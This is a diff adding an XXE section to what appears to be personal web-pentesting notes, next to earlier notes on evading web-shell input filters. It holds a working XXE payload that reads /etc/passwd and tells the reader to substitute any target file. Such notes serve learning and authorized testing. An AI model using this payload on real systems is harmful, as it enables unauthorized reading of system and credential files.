@@ -66,3 +66,22 @@ If a web shell filters your input, try to encode it into `base64`
 ![](Pasted%20image%2020240417160455.png)
 
 - If it doesn't work, try some [Command Injection 💄](command_injection.md)
+
+## XML file inclusion (XXE)
+
+- If a web accepts XML, it could be vulnerable to XXE.
+- You can try to upload a code like this to inspect the system:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [
+   <!ELEMENT data ANY >
+   <!ENTITY name SYSTEM "file:///etc/passwd" >]>
+<comment>
+  <name>&name;</name>
+  <author>Pavandeep</author>
+  <com>Hacking Articles</com>
+</comment>
+```
+
+- Change the `"file:///etc/passwd"` for the one you want
